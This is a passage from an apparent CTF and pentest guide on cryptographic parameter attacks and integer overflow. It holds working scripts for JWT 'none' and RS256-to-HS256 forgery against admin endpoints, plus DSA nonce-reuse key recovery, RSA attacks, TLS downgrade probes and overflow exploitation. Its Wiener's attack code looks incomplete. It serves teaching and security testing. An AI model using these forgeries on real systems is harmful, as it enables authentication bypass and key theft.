    q = (p - 1) // 2
    return is_prime(q)

def is_prime(n, k=40):
    """Miller-Rabin primality test"""
    from random import randint
    if n < 2: return False
    if n == 2 or n == 3: return True
    if n % 2 == 0: return False
    
    r, d = 0, n - 1
    while d % 2 == 0:
        r += 1
        d //= 2
    
    for _ in range(k):
        a = randint(2, n - 2)
        x = pow(a, d, n)
        if x == 1 or x == n - 1:
            continue
        for _ in range(r - 1):
            x = pow(x, 2, n)
            if x == n - 1:
                break
        else:
            return False
    return True

# Test captured DH prime
p = 0xFFFFF...  # Captured prime
print(f"Safe prime: {is_safe_prime(p)}")
EOF
```

**JWT Algorithm Confusion:**

**None Algorithm Attack:**

```bash
# JWT with "alg": "none" bypasses signature verification

# Original JWT
# Header: {"alg":"RS256","typ":"JWT"}
# Payload: {"user":"guest","role":"user"}

# Modified JWT
echo '{"alg":"none","typ":"JWT"}' | base64 -w0
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

echo '{"user":"admin","role":"admin"}' | base64 -w0  
# eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ

# Construct: header.payload. (note trailing dot, empty signature)
NEW_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."

curl -H "Authorization: Bearer $NEW_JWT" https://target.com/api/admin
```

**RS256 to HS256 Confusion:**

```python
# Server expects RS256 (asymmetric) but accepts HS256 (symmetric)
# Use public key as HMAC secret to forge signatures

import jwt
import requests

# Obtain public key
r = requests.get('https://target.com/.well-known/jwks.json')
public_key = r.json()['keys'][0]

# Or from certificate
public_key = open('public.pem', 'rb').read()

# Create JWT with HS256, using public key as secret
payload = {
    'user': 'admin',
    'role': 'admin',
    'exp': 9999999999
}

# Sign with public key as HMAC secret
token = jwt.encode(payload, public_key, algorithm='HS256')

# Send to server
r = requests.get('https://target.com/api/admin',
                headers={'Authorization': f'Bearer {token}'})
print(r.text)
```

**Using jwt_tool:**

```bash
# Automated JWT attacks
python3 jwt_tool.py JWT_TOKEN

# Test algorithm confusion
python3 jwt_tool.py JWT_TOKEN -X a

# Try "none" algorithm
python3 jwt_tool.py JWT_TOKEN -X n

# Crack weak HMAC secret
python3 jwt_tool.py JWT_TOKEN -C -d wordlist.txt

# Modify claims
python3 jwt_tool.py JWT_TOKEN -I -pc user -pv admin
```

**XML Encryption Parameter Injection:**

**Cipher Algorithm Substitution:**

```xml
<!-- Original XML Encryption -->
<EncryptedData>
  <EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#aes256-cbc"/>
  <CipherData>
    <CipherValue>BASE64_ENCRYPTED_DATA</CipherValue>
  </CipherData>
</EncryptedData>

<!-- Modified - weaker algorithm -->
<EncryptedData>
  <EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#tripledes-cbc"/>
  <CipherData>
    <CipherValue>REENCRYPTED_WITH_3DES</CipherValue>
  </CipherData>
</EncryptedData>

<!-- Or NULL cipher -->
<EncryptedData>
  <EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#rsa-1_5"/>
  <CipherData>
    <CipherValue>BASE64_PLAINTEXT</CipherValue>
  </CipherData>
</EncryptedData>
```

**Key Transport Method Manipulation:**

```xml
<!-- XML Key encryption - test for algorithm acceptance -->
<EncryptedKey>
  <EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#rsa-1_5"/>
  <!-- RSA PKCS#1 v1.5 - vulnerable to padding oracle (Bleichenbacher) -->
</EncryptedKey>

<!-- Test if server accepts weak wrapping -->
<EncryptedKey>
  <EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#kw-aes128"/>
  <!-- Key wrap with controlled key -->
</EncryptedKey>
```

**Symmetric Encryption Parameter Attacks:**

**AES Key Size Downgrade:**

```bash
# Test if application accepts different key sizes without validation

# Generate keys of different sizes
openssl rand -hex 16 > aes128.key  # 128-bit
openssl rand -hex 24 > aes192.key  # 192-bit  
openssl rand -hex 32 > aes256.key  # 256-bit

# Test with each key size
for keysize in 128 192 256; do
  key=$(cat aes${keysize}.key)
  curl -X POST https://target.com/encrypt \
    -d "key=$key&data=test" \
    -w "\nKey size: $keysize - Status: %{http_code}\n"
done

# If accepts smaller keys: security downgrade possible
```

**Block Cipher Mode Injection:**

```python
# If mode selection is user-controlled
import requests
from Crypto.Cipher import AES
import base64

# Test different modes
modes = ['ECB', 'CBC', 'CTR', 'OFB', 'CFB', 'GCM']

for mode in modes:
    r = requests.post('https://target.com/encrypt',
                     json={'mode': mode, 'plaintext': 'test'})
    print(f"{mode}: {r.status_code} - {r.text}")

# If ECB accepted: can identify identical plaintext blocks
# If CBC without IV validation: can manipulate
# If CTR with controlled nonce: keystream reuse possible
```

**Hash Algorithm Substitution:**

**MD5/SHA1 Injection:**

```bash
# Test if weaker hash algorithms accepted for signatures/MACs

# Original request (SHA-256)
curl -X POST https://target.com/api/sign \
  -d "data=test&algorithm=SHA256"

# Test weak algorithms
curl -X POST https://target.com/api/sign \
  -d "data=test&algorithm=MD5"

curl -X POST https://target.com/api/sign \
  -d "data=test&algorithm=SHA1"

# If accepted, may enable:
# - MD5: Collision attacks (create two inputs with same hash)
# - SHA1: Collision attacks (SHAttered attack demonstrated)
```

**Length Extension Attack (if validation missing):**

```python
# Affects: MD5, SHA-1, SHA-2 (not SHA-3/BLAKE2)
# If MAC = H(secret || message) without HMAC construction

from hashlib import sha256
import struct

def length_extension_attack(original_hash, known_message, append_data, secret_length):
    """
    Exploit length extension vulnerability
    [Unverified] Success requires knowing secret length
    """
    # Calculate padding for original message
    original_length = secret_length + len(known_message)
    padding_length = (55 - original_length) % 64
    padding = b'\x80' + b'\x00' * padding_length
    padding += struct.pack('>Q', original_length * 8)
    
    # New message: original || padding || appended
    forged_message = known_message + padding + append_data
    
    # Continue hashing from original hash state
    # (Requires hash state manipulation - use hashpump tool)
    return forged_message

# Using hashpump tool
# hashpump -s <original_hash> -d <known_data> -a <append_data> -k <secret_length>
```

```bash
# Example with hashpump
hashpump
# Input:
# Signature: c6cb4e9f2e1d8a9b3d5f6e7c8d9a0b1c2d3e4f5a
# Data: user=guest
# Key length: 16
# Data to append: &admin=true

# Output:
# New signature: a1b2c3d4...
# New data: user=guest\x80...\x00&admin=true
```

**Public Key Cryptography Parameter Attacks:**

**RSA Public Exponent Manipulation:**

```python
# Small public exponent attack (e=3)
from Crypto.PublicKey import RSA
from Crypto.Util.number import long_to_bytes
import gmpy2

def attack_rsa_small_e(ciphertexts, e=3):
    """
    If same message encrypted to multiple recipients with e=3
    Can recover plaintext without factoring (Håstad's broadcast attack)
    [Inference] Requires e ciphertexts with same plaintext
    """
    if len(ciphertexts) < e:
        return None
    
    # Apply Chinese Remainder Theorem
    # m^e mod N1 = C1
    # m^e mod N2 = C2  
    # m^e mod N3 = C3
    # Solve for m^e, then take e-th root
    
    # Using gmpy2 for CRT and root extraction
    n_prod = 1
    for n in [ct[1] for ct in ciphertexts]:
        n_prod *= n
    
    result = 0
    for c, n in ciphertexts:
        n_i = n_prod // n
        result += c * n_i * gmpy2.invert(n_i, n)
    result %= n_prod
    
    # Extract e-th root
    plaintext_int, is_exact = gmpy2.iroot(result, e)
    if is_exact:
        return long_to_bytes(int(plaintext_int))
    return None
```

**Common Modulus Attack:**

```python
# If same modulus N used with different exponents (e1, e2)
def common_modulus_attack(c1, c2, e1, e2, n):
    """
    Attack when message encrypted with same N but different e values
    Requires gcd(e1, e2) = 1
    """
    from Crypto.Util.number import inverse, long_to_bytes
    
    # Extended Euclidean algorithm: e1*s1 + e2*s2 = 1
    gcd, s1, s2 = egcd(e1, e2)
    
    if gcd != 1:
        return None
    
    # If s1 or s2 negative, use modular inverse
    if s1 < 0:
        c1 = inverse(c1, n)
        s1 = -s1
    if s2 < 0:
        c2 = inverse(c2, n)
        s2 = -s2
    
    # m = c1^s1 * c2^s2 mod n
    m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
    return long_to_bytes(m)

def egcd(a, b):
    """Extended Euclidean Algorithm"""
    if a == 0:
        return b, 0, 1
    gcd, x1, y1 = egcd(b % a, a)
    x = y1 - (b // a) * x1
    y = x1
    return gcd, x, y
```

**Wiener's Attack (Small Private Exponent):**

```python
# If d < N^0.25, can recover d via continued fractions
def wieners_attack(e, n):
    """
    Recover small private exponent
    [Unverified] Attack succeeds when d < N^0.25
    """
    from fractions import Fraction
    from Crypto.Util.number import long_to_bytes
    
    # Continued fraction expansion of e/n
    convergents = []
    frac = Fraction(e, n)
    
    # Generate convergents
    for k in range(1, 100000):
        if k > e:
            break
        
        # Test if convergent is d
        d_candidate = frac.denominator
        
        # Check if d_candidate is private exponent
        # e*d ≡ 1 (mod φ(n))
        # Try to factor n using φ(n) estimate
        phi_approx = (e * d_candidate - 1) // k
        
        # Solve: x^2 - (n - phi + 1)x + n = 0
        # Roots are p and q
        b = n - phi_approx + 1
        discriminant = b*b - 4*n
        
        if discriminant > 0:
            sqrt_disc = int(discriminant ** 0.5)
            if sqrt_disc * sqrt_disc == discriminant:
                p = (b + sqrt_disc) // 2
                q = (b - sqrt_disc) // 2
                if p * q == n:
                    return d_candidate
    
    return None
```

**Elliptic Curve Parameter Validation:**

**Invalid Curve Attack Test:**

```python
from ecdsa import SECP256k1
from ecdsa.ellipticcurve import Point

def test_invalid_point_acceptance(target_api, x, y):
    """
    Test if server validates point is on curve
    Send point not satisfying y² = x³ + ax + b (mod p)
    """
    import requests
    
    # Craft invalid point
    point_data = {'x': hex(x), 'y': hex(y)}
    
    r = requests.post(f'{target_api}/verify_point', json=point_data)
    
    if r.status_code == 200:
        print("[!] Server accepted invalid point - vulnerable!")
        return True
    elif 'not on curve' in r.text.lower():
        print("[+] Server validates curve membership")
        return False
    else:
        print("[?] Unclear response:", r.text)
        return None

# Test with definitely invalid point
curve = SECP256k1.curve
p = curve.p()

# Generate random x, calculate wrong y
x = 12345
y = 67890  # Not satisfying curve equation

test_invalid_point_acceptance('https://target.com/api', x, y)
```

**Twist Attack (Related Curve):**

```python
# Supply point on quadratic twist of intended curve
# If server doesn't validate curve parameters, computation on wrong curve

def generate_twist_point(curve_params):
    """
    [Inference] Generate point on quadratic twist
    Twist curve: y² = x³ + ax + b' where b' ≠ b
    """
    # For secp256k1: y² = x³ + 7
    # Twist: y² = x³ + b' (b' ≠ 7)
    
    # Find b' such that twist has weak properties
    # (e.g., smooth order for small-subgroup attack)
    pass
```

**DSA/ECDSA Parameter Attacks:**

**Nonce Reuse in DSA:**

```python
# If nonce (k) reused in two signatures, can recover private key
def recover_dsa_key_from_nonce_reuse(m1, m2, r, s1, s2, q):
    """
    Recover private key from two signatures with same k
    r = (g^k mod p) mod q (same for both signatures)
    s1 = k^-1(H(m1) + x*r) mod q
    s2 = k^-1(H(m2) + x*r) mod q
    """
    from hashlib import sha256
    from Crypto.Util.number import inverse
    
    h1 = int.from_bytes(sha256(m1).digest(), 'big') % q
    h2 = int.from_bytes(sha256(m2).digest(), 'big') % q
    
    # k = (h1 - h2) / (s1 - s2) mod q
    k = ((h1 - h2) * inverse(s1 - s2, q)) % q
    
    # x = (s1*k - h1) / r mod q
    x = ((s1 * k - h1) * inverse(r, q)) % q
    
    return x

# Detection: collect multiple signatures and check for repeated r values
def detect_nonce_reuse(signatures):
    """Check for DSA/ECDSA nonce reuse"""
    r_values = [sig['r'] for sig in signatures]
    if len(r_values) != len(set(r_values)):
        print("[!] Nonce reuse detected!")
        # Find duplicates
        from collections import Counter
        duplicates = [r for r, count in Counter(r_values).items() if count > 1]
        return duplicates
    return None
```

**Biased Nonce (Partial Key Exposure):**

```python
# If some bits of nonce are known/predictable
# Lattice attack can recover private key

# [Unverified] Requires advanced lattice reduction techniques
# Tools: Sage, FPYLLL

# Example: If k is biased (some bits always 0)
# Can be detected statistically and exploited
def detect_biased_nonce(signatures, bit_length):
    """Detect bias in nonce generation"""
    r_values = [sig['r'] for sig in signatures]
    
    # Check if high bits consistently 0
    high_bit_mask = (1 << bit_length) - (1 << (bit_length - 8))
    biased_count = sum(1 for r in r_values if r & high_bit_mask == 0)
    
    if biased_count > len(r_values) * 0.8:
        print(f"[!] Nonce bias detected: {biased_count}/{len(r_values)} have zero high bits")
        return True
    return False
```

**Protocol-Level Parameter Attacks:**

**SSL/TLS Version Downgrade:**

```bash
# POODLE: Force SSL 3.0
# Testing for downgrade vulnerability

# Using testssl.sh
testssl.sh -P https://target.com
# Check: TLS 1.0, SSL 3.0 support

# Manual test with openssl
openssl s_client -ssl3 -connect target.com:443
# If successful: downgrade possible

# FREAK: Force EXPORT-grade RSA
openssl s_client -cipher EXPORT -connect target.com:443

# If server accepts: RSA key can be factored (512-bit)
```

**Logjam (DHE Downgrade):**

```bash
# Force weak Diffie-Hellman parameters
nmap --script ssl-dh-params target.com

# Check for:
# - DH key < 2048 bits
# - Common primes (LogJam attack)

# Using testssl.sh
testssl.sh -L https://target.com
# Look for "Logjam" or weak DH parameters
```

**SSH Parameter Injection:**

```bash
# Test client parameter acceptance
ssh -o "KexAlgorithms=diffie-hellman-group1-sha1" user@target

# Server-side: check if accepts weak parameters from client
# Client-side: check if accepts weak parameters from server

# Enumerate accepted algorithms
nmap --script ssh2-enum-algos target.com -p 22
```

**Key Length Validation:**

**Detecting Insufficient Key Lengths:**

```python
import requests
from Crypto.PublicKey import RSA

def test_weak_key_acceptance(api_endpoint):
    """Test if server accepts weak RSA keys"""
    test_sizes = [512, 768, 1024, 2048, 4096]
    
    for size in test_sizes:
        # Generate key of specific size
        key = RSA.generate(size)
        pubkey_pem = key.publickey().export_key().decode()
        
        r = requests.post(api_endpoint, 
                         json={'public_key': pubkey_pem})
        
        print(f"{size}-bit key: {r.status_code}")
        
        if r.status_code == 200 and size < 2048:
            print(f"[!] Server accepts weak {size}-bit key!")
            return size
    
    return None

# Usage
test_weak_key_acceptance('https://target.com/api/register_key')
```

**Certificate Parameter Validation:**

**Weak Signature Algorithm:**

```bash
# Check certificate signature algorithm
openssl s_client -connect target.com:443 </dev/null 2>/dev/null | 
  openssl x509 -noout -text | grep "Signature Algorithm"

# Weak algorithms:
# - md5WithRSAEncryption
# - sha1WithRSAEncryption (deprecated)

# Check entire chain
echo | openssl s_client -showcerts -connect target.com:443 2>/dev/null |
  awk '/BEGIN/,/END/{print}' | 
  awk '/BEGIN/{i++}{print > "cert"i".pem"}'

for cert in cert*.pem; do
  echo "=== $cert ==="
  openssl x509 -noout -text -in $cert | grep "Signature Algorithm"
done
```

**Custom Protocol Testing:**

**Generic Parameter Fuzzing:**

```python
import requests
import json

def fuzz_crypto_parameters(endpoint, param_name, test_values):
    """Generic parameter fuzzing for crypto APIs"""
    
    results = []
    
    for value in test_values:
        payload = {param_name: value}
        
        try:
            r = requests.post(endpoint, json=payload, timeout=5)
            results.append({
                'value': value,
                'status': r.status_code,
                'response': r.text[:200],
                'accepted': r.status_code == 200
            })
        except Exception as e:
            results.append({
                'value': value,
                'error': str(e)
            })
    
    # Analyze results
    accepted = [r for r in results if r.get('accepted')]
    
    if accepted:
        print(f"[!] {len(accepted)} parameter values accepted:")
        for r in accepted:
            print(f"  - {r['value']}")
    
    return results

# Test encryption modes
modes = ['ECB', 'CBC', 'CTR', 'GCM', 'OFB', 'CFB', 'XTS', 'NULL']
fuzz_crypto_parameters('https://target.com/api/encrypt', 'mode', modes)

# Test key sizes
key_sizes = [40, 56, 64, 128, 192, 256, 512, 1024]
fuzz_crypto_parameters('https://target.com/api/encrypt', 'key_size', key_sizes)

# Test hash algorithms
hashes = ['MD5', 'SHA1', 'SHA224', 'SHA256', 'SHA384', 'SHA512', 'RIPEMD160']
fuzz_crypto_parameters('https://target.com/api/sign', 'hash_algo', hashes)
```

**Tools for Parameter Validation Testing:**

- **testssl.sh**: Comprehensive TLS/SSL parameter testing
- **sslyze**: Python-based SSL/TLS scanner
- **nmap**: SSL/SSH algorithm enumeration scripts
- **Burp Suite**: Manual parameter manipulation
- **jwt_tool**: JWT algorithm confusion testing
- **openssl**: Manual protocol and cipher testing

**Mitigation Detection:**

```bash
# Check if proper parameter validation exists

# 1. Reject weak algorithms
curl -X POST https://target.com/api/encrypt -d "algorithm=DES"
# Expected: 400 Bad Request with "unsupported algorithm"

# 2. Enforce minimum key sizes
curl -X POST https://target.com/api/register -d "key_size=512"
# Expected: Rejection of keys < 2048 bits

# 3. Validate curve points
# Send invalid EC point
# Expected: "Point not on curve" error

# 4. Fixed algorithm suites (no negotiation)
# Attempt algorithm substitution
# Expected: Ignore client-specified algorithms

# 5. Constant-time operations (timing analysis)
# Multiple requests with valid/invalid parameters
# Expected: No timing differences
```

**CTF-Specific Scenarios:**

[Inference] Common parameter validation challenges in CTFs:

- JWT with "alg":"none" bypass
- RSA encryption with user-supplied public key (small modulus)
- API accepting "algorithm" parameter (test ECB, weak ciphers)
- DH parameter negotiation allowing small primes
- ECDSA signature verification with client-supplied curve parameters
- Hash function selection via HTTP parameter (MD5 available)

---

**Related Important Subtopics:**

- **Bleichenbacher's Attack** (RSA PKCS#1 v1.5 padding oracle)
- **Timing Attacks** on cryptographic implementations
- **Cache-Timing Attacks** (e.g., AES T-table cache timing)
- **Fault Injection Attacks** (RSA-CRT fault attack)
- **Side-Channel Analysis** (power analysis, EM radiation)

---

## Integer Arithmetic

### Integer Overflow/Underflow

Integer overflow and underflow occur when arithmetic operations produce results outside the representable range of the integer type, causing the value to wrap around. In cryptographic contexts, these vulnerabilities can break security assumptions, bypass validation checks, or leak sensitive information.

**Fundamental concepts:**

**Overflow:** Occurs when a value exceeds the maximum representable value

```
Unsigned 8-bit: 255 + 1 = 0 (wraps to minimum)
Signed 8-bit: 127 + 1 = -128 (wraps to minimum)
```

**Underflow:** Occurs when a value falls below the minimum representable value

```
Unsigned 8-bit: 0 - 1 = 255 (wraps to maximum)
Signed 8-bit: -128 - 1 = 127 (wraps to maximum)
```

**Platform-specific integer sizes:**

**Linux (x86_64):**

```c
char:           8 bits  (-128 to 127 or 0 to 255)
short:          16 bits (-32,768 to 32,767)
int:            32 bits (-2,147,483,648 to 2,147,483,647)
long:           64 bits (-9,223,372,036,854,775,808 to 9,223,372,036,854,775,807)
unsigned int:   32 bits (0 to 4,294,967,295)
size_t:         64 bits (0 to 18,446,744,073,709,551,615)
```

**Windows (x64):**

```c
int:            32 bits (same as Linux)
long:           32 bits (differs from Linux x64)
long long:      64 bits
size_t:         64 bits
DWORD:          32 bits unsigned (0 to 4,294,967,295)
```

**Python:**

- Python 3 has arbitrary precision integers (no overflow by default)
- Must explicitly use fixed-width types (e.g., via `ctypes`, `struct`, or `numpy`) to trigger overflow

---

**Detection techniques:**

**1. Manual code review patterns:**

Look for these vulnerable patterns in cryptographic implementations:

```c
// Vulnerable: Length field addition without overflow check
unsigned int total_length = header_length + payload_length;
unsigned char *buffer = malloc(total_length);  // May allocate small buffer if overflow

// Vulnerable: Size multiplication
size_t array_size = num_elements * element_size;  // Overflows if num_elements is large
void *ptr = malloc(array_size);

// Vulnerable: Subtraction underflow in comparison
unsigned int remaining = end - start;  // Underflows if start > end
if (remaining > 0) {  // Always true after underflow
    // Process data
}

// Vulnerable: Loop counter overflow
for (unsigned int i = 0; i < max_value; i++) {
    // If max_value == UINT_MAX, infinite loop
}
```

**2. Testing for overflow conditions:**

**Python test harness:**

```python
import struct

def test_overflow_uint32(value):
    """Simulate 32-bit unsigned integer overflow"""
    return value & 0xFFFFFFFF

def test_overflow_int32(value):
    """Simulate 32-bit signed integer overflow"""
    value = value & 0xFFFFFFFF
    if value >= 0x80000000:
        value -= 0x100000000
    return value

# Test cases
print(test_overflow_uint32(0xFFFFFFFF + 1))  # 0
print(test_overflow_uint32(0xFFFFFFFF + 2))  # 1
print(test_overflow_int32(0x7FFFFFFF + 1))   # -2147483648
print(test_overflow_uint32(0 - 1))            # 4294967295
```

**C test program:**

```c
#include <stdio.h>
#include <limits.h>

int main() {
    unsigned int u_max = UINT_MAX;
    unsigned int u_overflow = u_max + 1;
    printf("Unsigned overflow: %u + 1 = %u\n", u_max, u_overflow);
    
    int s_max = INT_MAX;
    int s_overflow = s_max + 1;
    printf("Signed overflow: %d + 1 = %d\n", s_max, s_overflow);
    
    unsigned int u_underflow = 0 - 1;
    printf("Unsigned underflow: 0 - 1 = %u\n", u_underflow);
    
    return 0;
}
```

Compile and run:

```bash
gcc -o overflow_test overflow_test.c
./overflow_test
```

**3. Dynamic analysis with sanitizers:**

**AddressSanitizer (ASan) with unsigned-integer-overflow:**

```bash
# Compile with sanitizer
gcc -fsanitize=address,undefined -g overflow_test.c -o overflow_test

# Run (will detect undefined behavior but not unsigned overflow by default)
./overflow_test

# For unsigned overflow detection (requires UBSan)
gcc -fsanitize=unsigned-integer-overflow -g overflow_test.c -o overflow_test
./overflow_test
```

**Note:** [Inference] Unsigned integer overflow is defined behavior in C (wraps around) but signed overflow is undefined behavior; sanitizers primarily catch undefined behavior.

---

**Cryptographic exploitation scenarios:**

**Scenario 1: Length field overflow in packet parsing**

**Vulnerable code pattern:**

```c
struct packet {
    uint16_t header_len;
    uint16_t payload_len;
    unsigned char data[];
};

void process_packet(struct packet *pkt) {
    uint16_t total_len = pkt->header_len + pkt->payload_len;  // Overflow
    unsigned char *buffer = malloc(total_len);
    memcpy(buffer, pkt->data, total_len);  // Buffer overflow
}
```

**Exploitation:**

```python
# Create packet that triggers overflow
header_len = 0x8000   # 32768
payload_len = 0x8001  # 32769
# Total: 0x10001, wraps to 0x0001 in uint16_t

# malloc(1) allocates tiny buffer
# memcpy copies 65537 bytes → heap overflow
```

**CTF detection approach:**

```bash
# Look for length fields in protocol structures
grep -r "uint.*_len" challenge_binary

# Test with boundary values
python3 exploit.py --header-len 32768 --payload-len 32769

# Monitor with gdb
gdb ./challenge
break malloc
run < crafted_input.bin
print $rdi  # Check size argument to malloc
```

---

**Scenario 2: RSA modulus overflow in weak implementations**

**Vulnerable code (custom RSA implementation):**

```python
def rsa_encrypt_vulnerable(plaintext, e, n):
    # Assumes plaintext < n without validation
    return pow(plaintext, e, n)

# If plaintext encoding causes integer overflow before modular reduction:
n = 0xFFFFFFFFFFFFFFFF  # 64-bit modulus
plaintext = 0x10000000000000000  # Overflows 64-bit representation

# On systems with fixed-width integers, this wraps before pow() is called
```

**Exploitation approach:**

```python
# Test if system uses fixed-width integers
import ctypes

# Simulate 64-bit overflow
def overflow_64bit(value):
    return ctypes.c_uint64(value).value

n = 0xFFFFFFFFFFFFFFFF
plaintext = n + 1  # Should be reduced mod n, but may overflow first

result = overflow_64bit(plaintext)
print(f"After overflow: {result}")  # 0 if overflow occurs

# If vulnerable, ciphertext = 0^e mod n = 0
```

**Detection in CTF challenges:**

```bash
# Identify custom crypto implementations
strings challenge_binary | grep -i "encrypt\|decrypt\|rsa"

# Test with boundary values
python3 -c "print(pow(2**64, 65537, 2**64 - 59))"  # May behave unexpectedly

# Check if compiled without arbitrary precision support
file challenge_binary  # Look for statically linked libraries
```

---

**Scenario 3: Modular arithmetic overflow in key generation**

**Vulnerable Diffie-Hellman implementation:**

```c
// Vulnerable: Intermediate multiplication may overflow
uint64_t modular_mult(uint64_t a, uint64_t b, uint64_t m) {
    return (a * b) % m;  // a * b may overflow before modulo
}

// Example:
// a = 2^63, b = 2, m = 2^64 - 1
// a * b = 2^64 (overflows to 0 in uint64_t)
// Result: 0 instead of 1
```

**Secure implementation:**

```c
// Use 128-bit intermediate or modular multiplication algorithm
uint64_t modular_mult_safe(uint64_t a, uint64_t b, uint64_t m) {
    __uint128_t result = ((__uint128_t)a * b) % m;
    return (uint64_t)result;
}
```

**Testing for vulnerability:**

```python
def test_modular_mult_overflow():
    """Test if implementation handles large intermediate values"""
    import ctypes
    
    # Simulate 64-bit overflow
    a = 2**63
    b = 2
    m = 2**64 - 1
    
    # Vulnerable behavior
    vulnerable_result = ctypes.c_uint64(a * b).value % m
    print(f"Vulnerable result: {vulnerable_result}")  # 0
    
    # Correct behavior
    correct_result = (a * b) % m
    print(f"Correct result: {correct_result}")  # 1

test_modular_mult_overflow()
```

**CTF exploitation:**

```bash
# Send crafted values that trigger overflow
echo "a=9223372036854775808&b=2" | nc challenge.ctf 1337

# Monitor for unexpected zero results in key exchange
# If shared secret = 0, authentication may be bypassable
```

---

**Scenario 4: Timestamp/nonce overflow in authentication tokens**

**Vulnerable JWT implementation:**

```python
import time

def generate_token_vulnerable(user_id):
    # Unix timestamp as 32-bit integer
    timestamp = int(time.time())  # Overflows in 2038 (Y2038 problem)
    
    # Token validation period
    expiry = timestamp + 3600  # May overflow if timestamp near INT32_MAX
    
    token = f"{user_id}:{expiry}"
    return token

def validate_token_vulnerable(token):
    user_id, expiry = token.split(':')
    expiry = int(expiry) & 0xFFFFFFFF  # Truncate to 32-bit
    
    current_time = int(time.time()) & 0xFFFFFFFF
    
    # Vulnerable: If expiry overflowed to small value, always valid
    if current_time < expiry:
        return True
    return False
```

**Exploitation:**

```python
# Craft token with overflowed timestamp
import struct

# INT32_MAX = 2147483647 (2038-01-19)
malicious_expiry = 0x80000000  # Overflowed value (-2147483648 or 2147483648)

token = f"admin:{malicious_expiry}"

# If validation uses unsigned comparison, token is valid until 2106
# If validation uses signed comparison, may be immediately valid
```

**Detection approach:**

```bash
# Analyze timestamp handling
strings challenge_binary | grep -E "time|timestamp|epoch"

# Test with boundary timestamps
curl -H "Authorization: Bearer user:2147483647" http://challenge.ctf/api
curl -H "Authorization: Bearer user:2147483648" http://challenge.ctf/api

# Check for Y2038 vulnerabilities
python3 -c "import time; print(int(time.time()) + 2**31)"
```

---

**Scenario 5: Counter overflow in stream ciphers**

**Vulnerable counter mode implementation:**

```c
// CTR mode with 8-bit counter
void ctr_encrypt_vulnerable(uint8_t *plaintext, uint8_t *key, 
                            size_t len, uint8_t *ciphertext) {
    uint8_t counter = 0;
    
    for (size_t i = 0; i < len; i++) {
        uint8_t keystream = aes_encrypt_block(key, counter);
        ciphertext[i] = plaintext[i] ^ keystream;
        counter++;  // Overflows after 256 bytes
    }
}
```

**Exploitation:**

```python
# If counter overflows and repeats, keystream repeats
# This allows key recovery via XOR

# Capture ciphertext longer than counter size
ciphertext = capture_encrypted_data(300)  # 300 bytes

# Extract repeated keystream
c1 = ciphertext[0:256]
c2 = ciphertext[256:512]

# Known plaintext attack on repeated keystream
known_plaintext = b"GET / HTTP/1.1\r\n"
recovered_keystream = xor(c1[:len(known_plaintext)], known_plaintext)

# Decrypt subsequent blocks
plaintext = xor(c2[:len(known_plaintext)], recovered_keystream)
```

**Detection in challenges:**

```bash
# Look for small counter types
objdump -d challenge_binary | grep -A10 "counter"

# Test with messages longer than typical counter sizes
python3 exploit.py --message-size 300  # Test 8-bit overflow
python3 exploit.py --message-size 70000  # Test 16-bit overflow
```

---

**Tools for finding integer overflow vulnerabilities:**

**1. Static analysis with Clang-Tidy:**

```bash
# Install
sudo apt install clang-tidy

# Run checks
clang-tidy challenge.c -checks='clang-analyzer-*,cert-*' -- -I./include

# Specific integer overflow checks
clang-tidy challenge.c -checks='cert-int30-c,cert-int32-c' --
```

**2. Fuzzing with AFL++ (American Fuzzy Lop):**

```bash
# Install
sudo apt install afl++

# Compile with instrumentation
afl-gcc -fsanitize=undefined -o challenge_fuzz challenge.c

# Fuzz
afl-fuzz -i inputs/ -o findings/ ./challenge_fuzz @@

# Review crashes caused by integer overflow
ls findings/crashes/
```

**3. Symbolic execution with Angr:**

```python
import angr
import claripy

# Load binary
project = angr.Project('./challenge', auto_load_libs=False)

# Create symbolic input
input_size = 8
symbolic_input = claripy.BVS('input', input_size * 8)

# Set up state
state = project.factory.entry_state(stdin=symbolic_input)

# Add constraint: look for integer overflow leading to specific condition
# Example: Find input causing allocation size to wrap to small value
simulation = project.factory.simgr(state)

# Explore until target is reached
target_address = 0x401234  # Address after vulnerable malloc
simulation.explore(find=target_address)

if simulation.found:
    found_state = simulation.found[0]
    solution = found_state.solver.eval(symbolic_input, cast_to=bytes)
    print(f"Triggering input: {solution.hex()}")
```

**4. Manual testing with Python:**

```python
def find_overflow_pair(target_sum, bit_width=16):
    """Find two numbers that sum to target after overflow"""
    max_val = (1 << bit_width) - 1
    
    for a in range(max_val // 2, max_val + 1):
        for b in range(1, max_val + 1):
            if (a + b) & max_val == target_sum:
                print(f"{a} + {b} = {target_sum} (mod {max_val + 1})")
                return (a, b)
    return None

# Example: Find values that sum to 1 in 16-bit space
find_overflow_pair(1, 16)
# Output: 65535 + 2 = 1 (mod 65536)
```

---

**Mitigation detection in code review:**

When analyzing challenges, check if these protections are present:

**1. Compiler flags:**

```bash
# Check if binary compiled with overflow protection
checksec --file=challenge_binary

# Look for:
# - FORTIFY_SOURCE (buffer overflow protection)
# - Stack canaries
# - PIE (Position Independent Executable)

# Check compilation flags
readelf -p .comment challenge_binary
```

**2. Safe arithmetic libraries:**

```c
// GNU SafeInt
#include <stdckdint.h>

bool safe_add(int a, int b, int *result) {
    return !ckd_add(result, a, b);  // Returns false if overflow
}

// Manual checks
bool safe_mult(size_t a, size_t b, size_t *result) {
    if (a > SIZE_MAX / b) return false;  // Would overflow
    *result = a * b;
    return true;
}
```

**3. Runtime checks in Python/interpreted languages:**

```python
# Check if implementation uses fixed-width types
import sys

# Python 3 integers have unlimited precision by default
large_num = 2**1000  # No overflow

# But fixed-width operations may exist:
import struct
packed = struct.pack('I', 2**32)  # Raises error if overflow
```

---

**Platform-specific considerations:**

**Linux exploitation:**

- Check `/proc/sys/kernel/panic_on_oops` - system behavior on integer overflow errors
- Use `ulimit -c unlimited` to enable core dumps for overflow analysis
- GDB can catch overflow with `catch throw` for C++ exceptions from checked arithmetic

**Windows exploitation:**

- SafeInt library commonly used in production code
